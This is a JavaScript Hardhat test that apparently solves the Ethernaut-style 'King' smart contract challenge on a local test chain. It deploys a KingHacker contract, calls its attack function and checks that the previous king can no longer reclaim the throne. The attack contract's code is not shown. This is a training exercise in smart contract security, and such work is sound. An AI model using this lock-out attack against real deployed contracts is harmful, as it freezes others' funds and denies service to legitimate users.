const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("King", function () {
  it("king", async function () {
    const [user1, user2, user3] = await ethers.getSigners();
    console.log("user1", await user1.address);
    console.log("user2", await user2.address);
    console.log("user3", await user3.address);
    const King = await ethers.getContractFactory("King");
    const king = await King.connect(user2).deploy({
      value: 1,
    });
    await king.deployed();

    const KingHacker = await ethers.getContractFactory("KingHacker");
    const king_hacker = await KingHacker.deploy();
    await king_hacker.deployed();
    console.log(`king_hacker: ${await king_hacker.address}`);

    // get current data
    console.log(`owner: ${await king.owner()}, king: ${await king._king()}, prize: ${await king.prize()}`);

    // user3 claim king
    const tx1 = await user3.sendTransaction({
      to: king.address,
      value: (await king.prize()).add(1),
    });
    await tx1.wait();
    console.log(`owner: ${await king.owner()}, king: ${await king._king()}, prize: ${await king.prize()}`);

    // user2 reclaim king
    const tx2 = await user2.sendTransaction({
      to: king.address,
      value: (await king.prize()).add(1),
    });
    await tx2.wait();
    console.log(`owner: ${await king.owner()}, king: ${await king._king()}, prize: ${await king.prize()}`);

    // attack
    const tx = await king_hacker.attack(king.address, {
      value: (await king.prize()).add(1),
    });
    await tx.wait();
    console.log(`owner: ${await king.owner()}, king: ${await king._king()}, prize: ${await king.prize()}`);

    // user2 fail to reclaim king
    await expect(
      user2.sendTransaction({
        to: king.address,
        value: (await king.prize()).add(1),
      })
    ).to.be.revertedWith("Transaction reverted: function selector was not recognized and there's no fallback nor receive function");
  });
});
